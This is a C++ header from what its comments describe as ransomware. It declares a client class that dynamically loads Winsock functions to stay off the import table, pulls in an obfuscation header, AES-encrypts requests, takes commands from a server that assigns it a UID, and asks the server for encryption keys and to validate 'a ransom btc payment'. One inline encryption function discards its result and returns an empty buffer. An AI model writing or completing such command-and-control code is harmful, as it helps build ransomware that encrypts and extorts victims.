#ifndef _CLIENT_H_
#define _CLIENT_H_

#include "framework.h"
#include "net_types.h"
#include "obfuscate.h"
#include "net_common.h"

#include <memory>
#include <algorithm>

class Client {
public:

    Client(); // dynamically load winsock and put it in loaded dlls
    ~Client(); // unload winsock

	BOOL          Connect();
    BOOL          Disconnect();
    BOOL          MakeServerRequest( ClientRequest request, BOOL udp ); // Make a request from client to server 
    BOOL          PingServer(SocketTypes serverType);
    BOOL          ReceiveDataOnSocket(SocketTypes s);
    
protected:

    /*
        Load all dynamically loaded wsa functions
    */
    VOID          LoadWSAFunctions();

    /*
        Identify whether the client class has loaded wsa
        and a defined type of socket in 'type'
    */
    BOOL          SocketReady(SocketTypes type) const;

    inline std::vector<unsigned char> EncryptRequest(ClientRequest req) const {
        NET_BLOB blob;
        blob.aesKey = this->EncryptionKey;
        blob.cr     = req;
        std::vector<unsigned char> buff = NetCommon::AESEncryptBlob(blob);

        return {};
    }
   
    BOOL          DecryptRequest(ServerRequest& req);

    /*
        Send a message to the main tcp server
        i.e ask for public encryption key or validating a ransom btc payment
    */
    BOOL          TCPSendMessageToServer(ClientMessage message);

    /*
        Send a message to the udp server with information
        on the action the client wants the server to do,
        i.e connect to tcp server. Updates clients connected server
        to the tcp server info received in the udp response

        UDP Server used for quick communication and queries
    */
    BOOL          UDPSendMessageToServer(ClientMessage message);

    // Function pointers
    typedef SOCKET ( WINAPI* _socket)       ( int af, int type, int protocol );
    typedef int    ( WINAPI* _WSAStartup )  ( WORD wVersionRequired, LPWSADATA lpWSAData );
    typedef int    ( WINAPI* _closesocket ) ( SOCKET s );
    typedef int    ( WINAPI* _WSACleanup )  ( void );
    typedef int    ( WINAPI* _bind )        ( SOCKET s, const sockaddr* addr, int namelen );
    typedef int    ( WINAPI* _sendto )      ( SOCKET s, const char* buf, int len, int flags, const sockaddr* addr, int tolen );
    typedef int    ( WINAPI* _send )        ( SOCKET s, const char* buff, int len, int flags );
    typedef int    ( WINAPI* _recv )        ( SOCKET s, char* buf, int len, int flags );
    typedef int    ( WINAPI* _recvfrom )    ( SOCKET s, char* buf, int len, int flags, sockaddr* from, int* fromlen );
    typedef int    ( WINAPI* _connect )     ( SOCKET s, const sockaddr* addr, int namelen );

    // Dynamically loaded functions from the winsock library
    _socket       CreateSocket    = nullptr;
    _WSAStartup   StartWSA        = nullptr;
    _WSACleanup   CleanWSA        = nullptr;
    _closesocket  CloseSocket     = nullptr;
    _bind         BindSocket      = nullptr;
    _sendto       SendTo          = nullptr; 
    _send         Send            = nullptr;
    _recv         Receive         = nullptr;
    _recvfrom     ReceiveFrom     = nullptr;
    _connect      ConnectSocket   = nullptr; 

    // Further details on client
    BOOL          WSAInitialized  = FALSE;
    SOCKET        UDPSocket       = INVALID_SOCKET;
    SOCKET        TCPSocket       = INVALID_SOCKET;
    Server        ConnectedServer = { 0 };          // Information on the clients connected server
    long          ClientUID       = -1;             // UID is assigned by the server. Used to perform commands on one client
    std::string   EncryptionKey;                    // Public encryption key for RSA, ENCRYPT AND DECRYPT KEY FOR AES
};

#endif